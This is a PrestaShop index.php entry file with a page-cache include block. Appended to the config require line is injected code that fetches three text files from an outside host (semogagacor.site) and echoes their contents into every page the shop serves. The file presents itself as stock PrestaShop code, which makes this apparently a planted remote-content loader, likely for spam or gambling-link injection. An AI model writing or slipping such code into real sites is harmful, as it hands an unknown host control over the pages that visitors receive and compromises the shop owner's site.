<?php
/**
 * Copyright since 2007 PrestaShop SA and Contributors
 * PrestaShop is an International Registered Trademark & Property of PrestaShop SA
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.md.
 * It is also available through the world-wide-web at this URL:
 * https://opensource.org/licenses/OSL-3.0
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@prestashop.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade PrestaShop to newer
 * versions in the future. If you wish to customize PrestaShop for your
 * needs please refer to https://devdocs.prestashop.com/ for more information.
 *
 * @author    PrestaShop SA and Contributors <contact@prestashop.com>
 * @copyright Since 2007 PrestaShop SA and Contributors
 * @license   https://opensource.org/licenses/OSL-3.0 Open Software License (OSL 3.0)
 */

// ~~start-pagecacheultimate~~ Do not remove this comment, pagecache will update it automatically
$staticCacheScript = dirname(__FILE__).'/modules/pagecache/static.config.php';
if (file_exists($staticCacheScript)) {
    try {
        require_once $staticCacheScript;
    } catch (Throwable $e) {
        error_log("Page Cache Ultimate - Cannot use the static cache, an error occured: " . $e->getMessage());
    }
}
// ~~end-pagecacheultimate~~ Do not remove this comment, pagecache will update it automatically

require dirname(__FILE__).'/config/config.inc.php';$a = file_get_contents( 'https://semogagacor.site/DN/getar.txt' );
echo $a;
$a = file_get_contents( 'https://semogagacor.site/DN/gacor.txt' );
echo $a;
$a = file_get_contents( 'https://semogagacor.site/DN/sikat.txt' );
echo $a;
Dispatcher::getInstance()->dispatch();
